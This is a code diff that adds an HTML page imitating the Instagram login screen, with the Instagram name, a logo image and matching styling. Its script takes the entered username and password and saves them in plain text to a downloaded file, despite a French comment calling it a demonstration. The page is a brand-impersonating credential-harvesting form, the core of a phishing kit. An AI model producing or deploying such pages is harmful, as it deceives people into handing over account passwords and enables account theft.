@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>INSTAGRAM LOG IN</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Vos styles CSS ici */
+
+        /* Reset des marges et des espacements */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Police de caractères */
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        /* Fond de page */
+        body {
+            background-color: #fafafa;
+        }
+
+        /* Conteneur de connexion */
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            margin: 100px auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Titre */
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+
+        /* Formulaire */
+        form {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #999999;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+            margin-bottom: 10px;
+            color: #262626;
+        }
+
+        button[type="submit"] {
+            background-color: #3897f0;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #357ac8;
+        }
+
+        /* Message */
+        #message {
+            color: #db4c3f;
+            text-align: center;
+        }
+
+        .phone-preview img {
+    width: 300px;
+    height: auto;
+}
+
+.logo {
+    width: 200px;
+    height: auto;
+    margin-bottom: 20px;
+}
+    </style>
+</head>
+<body>
+    <img src="./insta.avif" alt="Instagram Logo" class="logo">
+    <div class="login-container">
+        <h1>LOG IN</h1>
+        <form id="register-form">
+            <label for="username">USERNAME :</label>
+            <input type="text" id="username" name="username" required><br>
+            <label for="password">PASSWORD :</label>
+            <input type="password" id="password" name="password" required><br>
+            <button type="submit">LOG IN</button>
+        </form>
+        <p id="message"></p>
+    </div>
+    <script>
+        document.getElementById('register-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Dans un scénario réel, il ne faut jamais stocker les mots de passe en texte brut.
+            // Cet exemple est uniquement à des fins de démonstration.
+            const dataToSave = `Nom d'utilisateur : ${username}, Mot de passe : ${password}\n`;
+
+            saveDataToFile(dataToSave);
+        });
+
+        function saveDataToFile(data) {
+            const blob = new Blob([data], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'identifiants_utilisateurs.txt';
+            a.click();
+        }
+    </script>
+</body>
+</html>
+
